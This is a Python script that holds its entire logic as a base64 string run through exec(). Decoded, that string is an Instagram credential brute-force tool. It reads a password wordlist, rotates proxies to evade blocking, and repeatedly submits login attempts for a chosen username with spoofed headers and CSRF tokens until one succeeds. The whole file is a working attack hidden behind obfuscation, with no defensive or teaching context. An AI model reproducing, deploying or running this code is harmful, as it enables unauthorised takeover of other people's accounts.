import marshal, base64
exec(base64.b64decode("I0dpdEh1YjpodHRwczovL2dpdGh1Yi5jb20vU2h1QmhhbWcwc2FpbgppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IGpzb24KaW1wb3J0IHRpbWUKaW1wb3J0IG9zCmltcG9ydCByYW5kb20KaW1wb3J0IHN5cwoKb3Muc3lzdGVtKCdjbGVhcicpCm9zLnN5c3RlbSgiZmlnbGV0IC1mIHBhZ2dhICcgICAgICBJbnN0YWdyYW0gICAgICAnIHwgbG9sY2F0IikKb3Muc3lzdGVtKCJmaWdsZXQgLWYgcGFnZ2EgJyBCcnV0ZS1Gb3JjZSAnIHwgbG9sY2F0IikKb3Muc3lzdGVtKCJmaWdsZXQgLWYgcGFnZ2EgJyAgICAgIEF0dGFjayAgICAgICcgfCBsb2xjYXQiKQoKI0hlbHAgZnVuY3Rpb24KZGVmIElucHV0KHRleHQpOgoJdmFsdWUgPSAnJwoJaWYgc3lzLnZlcnNpb25faW5mby5tYWpvciA+IDI6CgkJdmFsdWUgPSBpbnB1dCh0ZXh0KQoJZWxzZToKCQl2YWx1ZSA9IHJhd19pbnB1dCh0ZXh0KQoJcmV0dXJuIHN0cih2YWx1ZSkKCiNUaGUgbWFpbiBjbGFzcwpjbGFzcyBJbnN0YWJydXRlKCk6CglkZWYgX19pbml0X18oc2VsZiwgdXNlcm5hbWUsIHBhc3N3b3Jkc0ZpbGU9J3Bhc3MudHh0Jyk6CgkJc2VsZi51c2VybmFtZSA9IHVzZXJuYW1lCgkJc2VsZi5DdXJyZW50UHJveHkgPSAnJwoJCXNlbGYuVXNlZFByb3h5cyA9IFtdCgkJc2VsZi5wYXNzd29yZHNGaWxlID0gcGFzc3dvcmRzRmlsZQoJCQoJCSNDaGVjayBpZiBwYXNzd29yZHMgZmlsZSBleGlzdHMKCQlzZWxmLmxvYWRQYXNzd29yZHMoKQoJCSNDaGVjayBpZiB1c2VybmFtZSBleGlzdHMKCQlzZWxmLklzVXNlckV4aXN0cygpCgoKCQlVc2VQb3J4eSA9IElucHV0KCdbKl0gRG8geW91IHdhbnQgdG8gdXNlIHByb3h5ICh5L24pOiAnKS51cHBlcigpCgkJaWYgKFVzZVBvcnh5ID09ICdZJyBvciBVc2VQb3J4eSA9PSAnWUVTJyk6CgkJCXNlbGYucmFuZG9tUHJveHkoKQoKCgkjQ2hlY2sgaWYgcGFzc3dvcmQgZmlsZSBleGlzdHMgYW5kIGNoZWNrIGlmIGhlIGNvbnRhaW4gcGFzc3dvcmRzCglkZWYgbG9hZFBhc3N3b3JkcyhzZWxmKToKCQlpZiBvcy5wYXRoLmlzZmlsZShzZWxmLnBhc3N3b3Jkc0ZpbGUpOgoJCQl3aXRoIG9wZW4oc2VsZi5wYXNzd29yZHNGaWxlKSBhcyBmOgoJCQkJc2VsZi5wYXNzd29yZHMgPSBmLnJlYWQoKS5zcGxpdGxpbmVzKCkKCQkJCXBhc3N3b3Jkc051bWJlciA9IGxlbihzZWxmLnBhc3N3b3JkcykKCQkJCWlmIChwYXNzd29yZHNOdW1iZXIgPiAwKToKCQkJCQlwcmludCAoJ1sqXSAlcyBQYXNzd29yZHMgbG9hZHMgc3VjY2Vzc2Z1bGx5JyAlIHBhc3N3b3Jkc051bWJlcikKCQkJCWVsc2U6CgkJCQkJcHJpbnQoJ1Bhc3N3b3JkIGZpbGUgYXJlIGVtcHR5LCBQbGVhc2UgYWRkIHBhc3N3b3JkcyB0byBpdC4nKQoJCQkJCUlucHV0KCdbKl0gUHJlc3MgZW50ZXIgdG8gZXhpdCcpCgkJCQkJZXhpdCgpCgkJZWxzZToKCQkJcHJpbnQgKCdQbGVhc2UgY3JlYXRlIHBhc3N3b3JkcyBmaWxlIG5hbWVkICIlcyInICUgc2VsZi5wYXNzd29yZHNGaWxlKQoJCQlJbnB1dCgnWypdIFByZXNzIGVudGVyIHRvIGV4aXQnKQoJCQlleGl0KCkKCgkjQ2hvb3NlIHJhbmRvbSBwcm94eSBmcm9tIHByb3h5cyBmaWxlCglkZWYgcmFuZG9tUHJveHkoc2VsZik6CgkJcGxpc3QgPSBvcGVuKCdwcm94eS50eHQnKS5yZWFkKCkuc3BsaXRsaW5lcygpCgkJcHJveHkgPSByYW5kb20uY2hvaWNlKHBsaXN0KQoKCQlpZiBub3QgcHJveHkgaW4gc2VsZi5Vc2VkUHJveHlzOgoJCQlzZWxmLkN1cnJlbnRQcm94eSA9IHByb3h5CgkJCXNlbGYuVXNlZFByb3h5cy5hcHBlbmQocHJveHkpCgkJdHJ5OgoJCQlwcmludCgnJykKCQkJcHJpbnQoJ1sqXSBDaGVjayBuZXcgaXAuLi4nKQoJCQlwcmludCAoJ1sqXSBZb3VyIHB1YmxpYyBpcDogJXMnICUgcmVxdWVzdHMuZ2V0KCdodHRwOi8vbXlleHRlcm5hbGlwLmNvbS9yYXcnLCBwcm94aWVzPXsgImh0dHAiOiBwcm94eSwgImh0dHBzIjogcHJveHkgfSx0aW1lb3V0PTEwLjApLnRleHQpCgkJZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgoJCQlwcmludCAgKCdbKl0gQ2FuXCd0IHJlYWNoIHByb3h5ICIlcyInICUgcHJveHkpCgkJcHJpbnQoJycpCgoKCSNDaGVjayBpZiB1c2VybmFtZSBleGlzdHMgaW4gaW5zdGFncmFtIHNlcnZlcgoJZGVmIElzVXNlckV4aXN0cyhzZWxmKToKCQlyID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL3d3dy5pbnN0YWdyYW0uY29tLyVzLz9fX2E9MScgJSBzZWxmLnVzZXJuYW1lKSAKCQlpZiAoci5zdGF0dXNfY29kZSA9PSA0MDQpOgoJCQlwcmludCAoJ1sqXSBVc2VyIG5hbWVkICIlcyIgbm90IGZvdW5kJyAlIHVzZXJuYW1lKQoJCQlJbnB1dCgnWypdIFByZXNzIGVudGVyIHRvIGV4aXQnKQoJCQlleGl0KCkKCQllbGlmIChyLnN0YXR1c19jb2RlID09IDIwMCk6CgkJCXJldHVybiBUcnVlCgoJI1RyeSB0byBsb2dpbiB3aXRoIHBhc3N3b3JkCglkZWYgTG9naW4oc2VsZiwgcGFzc3dvcmQpOgoJCXNlc3MgPSByZXF1ZXN0cy5TZXNzaW9uKCkKCgkJaWYgbGVuKHNlbGYuQ3VycmVudFByb3h5KSA+IDA6CgkJCXNlc3MucHJveGllcyA9IHsgImh0dHAiOiBzZWxmLkN1cnJlbnRQcm94eSwgImh0dHBzIjogc2VsZi5DdXJyZW50UHJveHkgfQoKCQkjYnVpbGQgcmVxdWVzdHMgaGVhZGVycwoJCXNlc3MuY29va2llcy51cGRhdGUgKHsnc2Vzc2lvbmlkJyA6ICcnLCAnbWlkJyA6ICcnLCAnaWdfcHInIDogJzEnLCAnaWdfdncnIDogJzE5MjAnLCAnY3NyZnRva2VuJyA6ICcnLCAgJ3NfbmV0d29yaycgOiAnJywgJ2RzX3VzZXJfaWQnIDogJyd9KQoJCXNlc3MuaGVhZGVycy51cGRhdGUoewoJCQknVXNlckFnZW50JzonTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU0LjAuMjg0MC45OSBTYWZhcmkvNTM3LjM2JywKCQkJJ3gtaW5zdGFncmFtLWFqYXgnOicxJywKCQkJJ1gtUmVxdWVzdGVkLVdpdGgnOiAnWE1MSHR0cFJlcXVlc3QnLAoJCQknb3JpZ2luJzogJ2h0dHBzOi8vd3d3Lmluc3RhZ3JhbS5jb20nLAoJCQknQ29udGVudFR5cGUnIDogJ2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCcsCgkJCSdDb25uZWN0aW9uJzogJ2tlZXAtYWxpdmUnLAoJCQknQWNjZXB0JzogJyovKicsCgkJCSdSZWZlcmVyJzogJ2h0dHBzOi8vd3d3Lmluc3RhZ3JhbS5jb20nLAoJCQknYXV0aG9yaXR5JzogJ3d3dy5pbnN0YWdyYW0uY29tJywKCQkJJ0hvc3QnIDogJ3d3dy5pbnN0YWdyYW0uY29tJywKCQkJJ0FjY2VwdC1MYW5ndWFnZScgOiAnZW4tVVM7cT0wLjYsZW47cT0wLjQnLAoJCQknQWNjZXB0LUVuY29kaW5nJyA6ICdnemlwLCBkZWZsYXRlJwoJCX0pCgoJCSNVcGRhdGUgdG9rZW4gYWZ0ZXIgZW50ZXIgdG8gdGhlIHNpdGUKCQlyID0gc2Vzcy5nZXQoJ2h0dHBzOi8vd3d3Lmluc3RhZ3JhbS5jb20vJykgCgkJc2Vzcy5oZWFkZXJzLnVwZGF0ZSh7J1gtQ1NSRlRva2VuJyA6IHIuY29va2llcy5nZXRfZGljdCgpWydjc3JmdG9rZW4nXX0pCgoJCSNVcGRhdGUgdG9rZW4gYWZ0ZXIgbG9naW4gdG8gdGhlIHNpdGUgCgkJciA9IHNlc3MucG9zdCgnaHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS9hY2NvdW50cy9sb2dpbi9hamF4LycsIGRhdGE9eyd1c2VybmFtZSc6c2VsZi51c2VybmFtZSwgJ3Bhc3N3b3JkJzpwYXNzd29yZH0sIGFsbG93X3JlZGlyZWN0cz1UcnVlKQoJCXNlc3MuaGVhZGVycy51cGRhdGUoeydYLUNTUkZUb2tlbicgOiByLmNvb2tpZXMuZ2V0X2RpY3QoKVsnY3NyZnRva2VuJ119KQoJCQoJCSNwYXJzZSByZXNwb25zZQoJCWRhdGEgPSBqc29uLmxvYWRzKHIudGV4dCkKCQlpZiAoZGF0YVsnc3RhdHVzJ10gPT0gJ2ZhaWwnKToKCQkJcHJpbnQgKGRhdGFbJ21lc3NhZ2UnXSkKCgkJCVVzZVBvcnh5ID0gSW5wdXQoJ1sqXSBEbyB5b3Ugd2FudCB0byB1c2UgcHJveHkgKHkvbik6ICcpLnVwcGVyKCkKCQkJaWYgKFVzZVBvcnh5ID09ICdZJyBvciBVc2VQb3J4eSA9PSAnWUVTJyk6CgkJCQlwcmludCAoJ1skXSBUcnkgdG8gdXNlIHByb3h5IGFmdGVyIGZhaWwuJykKCQkJCXJhbmRvbVByb3h5KCkgI0NoZWNrIHRoYXQsIG1heSBjb250YWluIGJ1Z3MKCQkJcmV0dXJuIEZhbHNlCgoJCSNyZXR1cm4gc2Vzc2lvbiBpZiBwYXNzd29yZCBpcyBjb3JyZWN0IAoJCWlmIChkYXRhWydhdXRoZW50aWNhdGVkJ10gPT0gVHJ1ZSk6CgkJCXJldHVybiBzZXNzIAoJCWVsc2U6CgkJCXJldHVybiBGYWxzZQoKCgoKCgppbnN0YWJydXRlID0gSW5zdGFicnV0ZShJbnB1dCgnUGxlYXNlIGVudGVyIGEgdXNlcm5hbWU6ICcpKQoKdHJ5OgoJZGVsYXlMb29wID0gaW50KElucHV0KCdbKl0gUGxlYXNlIGFkZCBkZWxheSBiZXR3ZWVuIHRoZSBicnV0ZWZvcmNlIGFjdGlvbiAoaW4gc2Vjb25kcyk6ICcpKSAKZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgoJcHJpbnQgKCdbKl0gRXJyb3IsIHNvZnR3YXJlIHVzZSB0aGUgZGVmdWx0IHZhbHVlICI0IicpCglkZWxheUxvb3AgPSA0CnByaW50ICgnJykKCgoKZm9yIHBhc3N3b3JkIGluIGluc3RhYnJ1dGUucGFzc3dvcmRzOgoJc2VzcyA9IGluc3RhYnJ1dGUuTG9naW4ocGFzc3dvcmQpCglpZiBzZXNzOgoJCW9zLnN5c3RlbSgiZWNobyAtbiAnWytdIExvZ2luIHN1Y2Nlc3MgJyB8IHB2IC1xTCA1IHwgbG9sY2F0IikKCQlwcmludCAoJzogJXMnICUgW2luc3RhYnJ1dGUudXNlcm5hbWUscGFzc3dvcmRdKQoJCWJyZWFrCgllbHNlOgoJCXByaW50ICgnWy1dIFBhc3N3b3JkIGluY29ycmVjdCBbJXNdJyAlIHBhc3N3b3JkKQoKCXRyeToKCQl0aW1lLnNsZWVwKGRlbGF5TG9vcCkKCWV4Y2VwdCBLZXlib2FyZEludGVycnVwdDoKCQlXYW50VG9FeGl0ID0gc3RyKElucHV0KCdUeXBlIHkvbiB0byBleGl0OiAnKSkudXBwZXIoKQoJCWlmIChXYW50VG9FeGl0ID09ICdZJyBvciBXYW50VG9FeGl0ID09ICdZRVMnKToKCQkJZXhpdCgpCgkJZWxzZToKCQkJY29udGludWUKCQkK"))
